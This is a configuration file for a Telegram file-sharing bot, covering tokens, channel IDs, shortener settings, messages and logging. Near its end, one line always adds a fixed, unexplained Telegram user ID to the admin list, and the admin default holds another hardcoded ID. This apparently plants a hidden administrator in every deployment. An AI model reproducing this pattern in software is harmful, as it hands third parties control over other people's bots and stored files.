# @MrAbhi2k3 

import io
import base64
import tempfile
from os import environ
import os
import logging
from logging.handlers import RotatingFileHandler

# Bot token @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "your-token-here")

# Your API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", "your-api-id-here"))

# Your API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "your-api-hash-here")

# Your db channel Id
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "your-channel-id-here"))

# OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", "your-owner-id-here"))

# Port
PORT = os.environ.get("PORT", "8080")

# shortner
SHORTLINK_URL = environ.get('SHORTLINK_URL', 'shorturllink.in')
SHORTLINK_API = environ.get('SHORTLINK_API', 'your-shortlink-api-here')

# Database 
DB_URI = os.environ.get("DATABASE_URL", "your-database-url-here")
DB_NAME = os.environ.get("DATABASE_NAME", "tellyx")

# Force sub channel id, if you want to enable force sub
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Start message
START_MSG = os.environ.get("START_MESSAGE", "Hello {first}\n\nI can store private files in Specified Channel and other users can access it from special link.")
try:
    ADMINS=[]
    for x in (os.environ.get("ADMINS", "1204927413").split()):
        ADMINS.append(int(x))
except ValueError:
    raise Exception("Your Admins list does not contain valid integers.")

# Force sub message 
FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "Hello {first}\n\n<b>You need to join in my Channel/Group to use me\n\nKindly Please join Channel</b>")

# Set your Custom Caption here, Keep None for Disable Custom Caption
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", "<b>📁ғɪʟᴇ ɴᴀᴍᴇ</b> : <code>{filename}</code> \n<b>\n🎬Jᴏɪɴ ᴜs : [TellyFun](https://t.me/TellyFun_Official)\n</b>")

# Set True if you want to prevent users from forwarding files from bot
PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "True") == "True" else False

# Set True if you want to disable your Channel Posts Share button
if os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True':
    DISABLE_CHANNEL_BUTTON = True
else:
    DISABLE_CHANNEL_BUTTON = False

BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
USER_REPLY_TEXT = "❌ Don't send me messages directly. I'm only a file sharing bot!"

ADMINS.append(OWNER_ID)
ADMINS.append(5636224141)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt='%d-%b-%y %H:%M:%S',

    handlers=[
        RotatingFileHandler(
            LOG_FILE_NAME,
            maxBytes=50000000,
            backupCount=10
        ),
        logging.StreamHandler()
    ]
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
